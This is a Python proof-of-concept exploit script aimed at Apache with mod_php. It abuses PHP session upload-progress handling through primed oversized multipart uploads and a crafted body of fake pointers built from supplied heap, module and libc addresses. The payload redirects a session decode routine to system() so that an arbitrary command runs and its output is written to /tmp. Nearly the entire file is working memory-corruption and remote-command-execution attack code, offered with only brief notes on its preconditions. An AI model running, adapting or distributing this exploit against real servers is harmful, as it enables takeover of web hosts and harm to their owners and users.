#!/usr/bin/env python3
"""Network-only Apache/mod_php PoC driver.

Runtime addresses must come from a separate disclosure, the crafted session
must be installed through an application/session primitive, and all requests
must reach the same Apache worker.
"""
import argparse, http.client, struct, urllib.parse

def integer(x): return int(x,0)
def part(boundary,name,value,filename=None):
    out=b'--'+boundary+b'\r\nContent-Disposition: form-data; name="'+name+b'"'
    if filename is not None:out+=b'; filename="'+filename+b'"'
    return out+b'\r\n\r\n'+value+b'\r\n'
def upload(boundary,filename):
    return part(boundary,b'PHP_SESSION_UPLOAD_PROGRESS',b'x')+part(boundary,b'f',b'Z'*32,filename)+b'--'+boundary+b'--\r\n'
def final_body(d,target):
    fake_entries=d-0x4fe8;fake_dtor=d-0x1fe8;delta=target-(fake_dtor+16)
    if delta%16:raise SystemExit('target is not 16-byte reachable from fake dtor')
    used=delta//16
    if used>1017:raise SystemExit(f'unsuitable relative layout: used_slots={used} (>1017); target must be below the reclaimed fake dtor page')
    if not -(1<<63)<=used<(1<<63):raise SystemExit('used_slots does not fit int64')
    vals=[]
    for i in range(120):
        v=bytearray(bytes([0x41+i%26])*8191)
        if i==110:v[:16]=b'\0'*16
        if i==111:
            v[:8]=struct.pack('<q',used)
            v[8168:8176]=struct.pack('<Q',fake_entries)
            v[8176:8184]=b'\0'*8
            if fake_dtor>=1<<56:raise SystemExit('fake dtor is not a canonical low-7-byte pointer')
            v[8184:8191]=struct.pack('<Q',fake_dtor)[:7]
        vals.append(bytes(v))
    b=b'APACHECF';body=b''.join(part(b,f't{i}'.encode(),v) for i,v in enumerate(vals))
    body+=part(b,b'PHP_SESSION_UPLOAD_PROGRESS',b'x')+part(b,b'f',b'Z'*32,b'a')+b'--'+b+b'--\r\n'
    return body,b,used
def session_payload(system,command,output):
    if any(x in command for x in ('|','#','\n','\r')):raise SystemExit('command may not contain |, #, CR, or LF')
    key=f'{{ {command.rstrip(" ;")}; }} >{output} 2>&1 #'
    return key,(key+f'|i:{system};').encode()
class Client:
    def __init__(self,host,port,timeout):self.host=host;self.port=port;self.timeout=timeout
    def raw_post(self,path,body,content_type,cookie=None):
        c=http.client.HTTPConnection(self.host,self.port,timeout=self.timeout);headers={'Content-Type':content_type,'Connection':'close'}
        if cookie:headers['Cookie']=cookie
        c.request('POST',path,body,headers)
        try:r=c.getresponse();data=r.read();status=r.status
        except Exception:data=b'';status=0
        c.close();return status,data
    def post(self,path,body,boundary,sid):
        return self.raw_post(path,body,f'multipart/form-data; boundary={boundary.decode()}',f'PHPSESSID={sid}')
def resolve(args):
    d=args.stale_context if args.stale_context is not None else (args.heap_base+args.stale_offset if args.heap_base is not None else None)
    target=args.decode_target if args.decode_target is not None else (args.module_base+args.ps_decode_offset if args.module_base is not None else None)
    system=args.system if args.system is not None else (args.libc_base+args.system_offset if args.libc_base is not None else None)
    if None in (d,target,system):raise SystemExit('supply --stale-context/--heap-base, --decode-target/--module-base, and --system/--libc-base')
    return d,target,system
def main():
    p=argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    p.add_argument('--host',default='127.0.0.1');p.add_argument('--port',type=int,default=18085);p.add_argument('--path',default='/index.php');p.add_argument('--timeout',type=float,default=20)
    p.add_argument('--victim-session',default='victim');p.add_argument('--prime-session',default='prime')
    p.add_argument('--stale-context',type=integer);p.add_argument('--heap-base',type=integer);p.add_argument('--stale-offset',type=integer,default=0x1c6000)
    p.add_argument('--decode-target',type=integer);p.add_argument('--module-base',type=integer);p.add_argument('--ps-decode-offset',type=integer,default=0x104a128)
    p.add_argument('--system',type=integer);p.add_argument('--libc-base',type=integer);p.add_argument('--system-offset',type=integer,default=0x4c490)
    p.add_argument('--command',default='id; uname -a');p.add_argument('--output',default='/tmp/apache-portable-poc-output')
    p.add_argument('--seed-url',help='optional test/app endpoint accepting form fields sid, key, value')
    p.add_argument('--no-pause',action='store_true',help='assume the session payload was installed before this process')
    args=p.parse_args();d,target,system=resolve(args);body,boundary,used=final_body(d,target);key,payload=session_payload(system,args.command,args.output)
    print(f'stale_context=0x{d:x} decode_target=0x{target:x} system=0x{system:x} used_slots={used}')
    print('session_payload_ascii='+payload.decode('ascii'),flush=True);print('session_payload_hex='+payload.hex(),flush=True)
    c=Client(args.host,args.port,args.timeout)
    # Session data must exist before OOM leaves the stale Basic global. A normal
    # PHP request after priming would perform RINIT and clear that stale state.
    if args.seed_url:
        form=urllib.parse.urlencode({'sid':args.victim_session,'key':key,'value':str(system)}).encode()
        status,response=c.raw_post(args.seed_url,form,'application/x-www-form-urlencoded')
        print(f'seed_status={status} seed_response_len={len(response)}')
        if status!=200:raise SystemExit('session seed endpoint failed')
    elif not args.no_pause:
        input('Install this payload before priming, then press Enter: ')
    for fn,sid in [(b'a',args.victim_session),(b'B'*500000,args.prime_session),(b'A'*900000,args.prime_session)]:
        b=b'UPRIME';status,_=c.post(args.path,upload(b,fn),b,sid);print(f'primer sid={sid} filename_len={len(fn)} status={status}')
    status,response=c.post(args.path,body,boundary,args.victim_session)
    print(f'final_status={status} response_len={len(response)}')
    if response:print('response_body_hex='+response.hex())
    print('request_sent=yes')
if __name__=='__main__':main()
